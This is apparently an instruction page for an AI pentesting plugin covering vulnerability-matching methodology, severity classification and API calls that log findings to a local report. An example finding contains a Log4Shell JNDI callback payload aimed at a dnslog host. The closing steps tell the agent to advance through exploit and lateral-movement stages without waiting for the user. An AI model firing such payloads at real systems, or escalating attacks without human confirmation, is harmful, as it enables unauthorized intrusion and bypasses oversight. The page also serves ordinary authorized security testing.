---
name: kb-triage
description: CVE/PoC knowledge base · Methodology: fingerprint-to-vulnerability matching, safe PoC verification and evidence collection, report template, severity/CVSS classification, and recording findings in the vulnerability report. Read this before other categories to avoid unnecessary detours; no specific CVEs.
verified: false
sources: Compiled from public sources (CVE advisories / public analyses / business-logic issues; see each entry's references)
---

# Methodology (3 entries)
> Entries are compiled from public sources (see References below). `Exploitation steps` are unverified hypotheses; validate against the target version before reporting and set `verified` to true only after verification.

Use this page to establish the workflow, then consult categories for the target type. Order: **identify asset → fingerprint → version → match → minimal verification → exploit → collect evidence → cleanup**.

## Entries

| File | Vulnerability | Severity | Entry point |
|---|---|---|---|
| `fingerprint-workflow.md` | Fingerprint-to-vulnerability matching workflow | info | - |
| `report-template.md` | Vulnerability report template | info | - |
| `safe-verification.md` | Safe PoC verification and evidence-collection standards | info | - |

## Three ground rules

1. **Do not draw conclusions without a version match**: an unresponsive PoC may indicate a patch, a WAF, or an unaffected version—report these possibilities separately.
2. **Read before writing**: prefer `GET /version`, `INFO`, `/actuator`, or configuration reads for unauthenticated checks; defer write-based PoCs (webshells, configuration changes) until a second, authorized step.
3. **Every conclusion needs minimal reproducible evidence**: one command and an excerpt of the raw response (text, not a screenshot).

## Severity / CVSS classification (consistent across this knowledge base)

| Scenario | severity | Reference CVSS |
|---|---|---|
| Unauthenticated RCE / domain or device takeover / financial impact (can affect balances or financial state) | critical | 9.0-10.0 |
| RCE requiring low privileges / arbitrary file read / unauthorized sensitive-data access / credential disclosure | high | 7.0-8.9 |
| Conditional information disclosure / enumeration / low-frequency abuse | medium | 4.0-6.9 |

- **Financial impact is always classified as critical** (even if the calculated CVSS is 8.x); state "can affect financial state" in the entry.
- CVSS is a reference only; entry severity follows this table. If the two conflict, follow this table and adjust cvss.
## Record findings in the vulnerability report (one entry per confirmed vulnerability)

The plugin has a top-level "Vulnerability report" tab that reads `$DSH_HOME/vuln-report/findings.json`. **Write each confirmed vulnerability with one command** (use the actual GUI port; default 127.0.0.1:54429):

```bash
curl -s -X POST http://127.0.0.1:54429/api/dsh-prompt-custom/findings \
  -H 'content-type: application/json' \
  -d '{
    "action":"upsert",
    "title":"Apache Log4j2 JNDI injection (Log4Shell)",
    "severity":"critical",
    "cvss":10.0,
    "target":"oa.example.com",
    "url":"https://oa.example.com/api/login",
    "category":"Java deserialization / JNDI",
    "cve":"CVE-2021-44228",
    "verified":true,
    "evidence":"User-Agent: ${jndi:ldap://x.dnslog.cn/a} → DNSLog received a callback at 2026-11-05T09:12:33Z",
    "description":"The login endpoint logs User-Agent; log4j-core 2.14.1 resolves the lookup.",
    "remediation":"Upgrade log4j-core to 2.17.0+; temporary mitigation: -Dlog4j2.formatMsgNoLookups=true."
  }'
```

- `severity` must be `critical / high / medium / low / info`; use this file's "Severity / CVSS classification".
- To report the same vulnerability again, include the returned `id` as `"id":"..."` to update it rather than insert a duplicate.
- After remediation, change status: `{"action":"status","id":"<id>","status":"fixed"}`; use `false-positive` for false positives.
- Export for review: open `http://127.0.0.1:54429/api/dsh-prompt-custom/findings.md` in a browser, or click "Export Markdown" in the tab.
- **Do not set `verified:true` for unverified findings**; include only minimal, redacted evidence, never credentials or identity documents.
### Ports and encoding (two real pitfalls)

- **The port is not fixed at 54429**: it is the GUI port of the current Desktop runtime and may change at every launch (for example, 57641). Obtain it from the browser address bar, current session runtime context, or `(Get-NetTCPConnection -State Listen | Where-Object LocalPort -gt 1024).LocalPort`. Frontend examples automatically include `location.origin`, making them the safest to copy.
- **PowerShell can corrupt JSON containing non-ASCII text**: on Windows, a request such as `Invoke-RestMethod -Body '{"title":"SQL injection 🔎"}'` may use GBK, causing the host to return `400 invalid JSON body`. Use explicit UTF-8:

```powershell
$json = '{"action":"upsert","title":"SQL injection 🔎","severity":"high"}'
Invoke-RestMethod -Uri "http://127.0.0.1:$port/api/dsh-prompt-custom/findings" -Method POST -ContentType 'application/json; charset=utf-8' -Body ([Text.Encoding]::UTF8.GetBytes($json))
```

```bash
# Alternatively, write a UTF-8 file and send it (works across shells)
curl -s -X POST "http://127.0.0.1:$port/api/dsh-prompt-custom/findings" -H "content-type: application/json" --data-binary "@finding.json"
```

ASCII-only payloads are unaffected; Chinese text and emoji can trigger this problem.
## Advance through the task ledger (automated orchestration)

The plugin provides two interfaces to use with the workflow above:

```
POST /api/dsh-prompt-custom/match        {"port":61616,"banner":"ActiveMQ 5.17.3"} → Candidate entries with match reasons
GET  /api/dsh-prompt-custom/campaigns    Task list / ?id= details (including next-step suggestions)
POST /api/dsh-prompt-custom/campaigns    {"action":"create|patch|asset|step|attempt|delete|next", ...}
```

Recommended loop (one action per round, then record it in the ledger):

1. `asset`: record newly discovered hosts/ports/fingerprints in the current task.
2. `match`: obtain candidate entries from fingerprints and select one (critical first).
3. Verify using the entry's PoC; on success, record a `finding` (Vulnerability report tab) and set the asset's `status` to `verified`.
4. `step`: record the command and conclusion for this step (so work can resume after interruption).
5. `next`: retrieve the next-stage suggestion; advance the stage with `patch`.

`stage` order: recon → fingerprint → match → verify → exploit → lateral → report.
Do not cram the entire campaign into one conversation turn: **one step per round, persist each step**. This enables resumption and automatic report growth.
### Session association (ledger only, no injection)

- A task can record the conversation it belongs to (`sessionId`), solely for ledger organization and display.
- The plugin **no longer injects messages or system sections into running conversations**: early `followup` wakeups corrupted history (`messages[N]` missing `role`, providers rejecting mid-conversation system updates); this behavior was removed.
- Advance manually: say "continue task X" in the conversation; the AI reads the ledger and records steps and stages with `campaign_upsert`.
## Complete these four steps each round (do not stop at a single stage)

1. Read the stage and `instructions` using `pipeline_next` (the returned list is this round's to-do list).
2. Call `kb_match` or `skill` for the stage (category mappings are in the plugin's fixed-rules section).
3. Verify against the entry's criteria; on success, write `finding_upsert`; otherwise try the next candidate.
4. Record the step with `campaign_upsert(command, result, advance=true)` and **advance one stage**, then return to step 1 until `report`.

Advance immediately when a stage's objective is met; do not wait for the user to say "next".
